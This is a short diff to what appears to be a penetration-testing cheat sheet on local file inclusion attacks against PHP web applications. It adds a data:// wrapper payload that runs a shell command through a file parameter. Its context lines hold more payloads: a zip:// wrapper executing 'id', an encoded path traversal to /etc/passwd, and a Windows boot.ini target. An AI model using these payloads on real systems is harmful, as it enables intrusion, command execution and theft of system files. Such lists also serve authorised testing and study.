@@ -20,6 +20,9 @@ zip://uploads/upload_1672890542.zip%23[filename inside zip]&cmd=id
 # URL encode
 http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 
+# Data filter
+/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
 # If site return error code on fail, use ffuf or burp intruder
 
 c:\boot.ini for windows
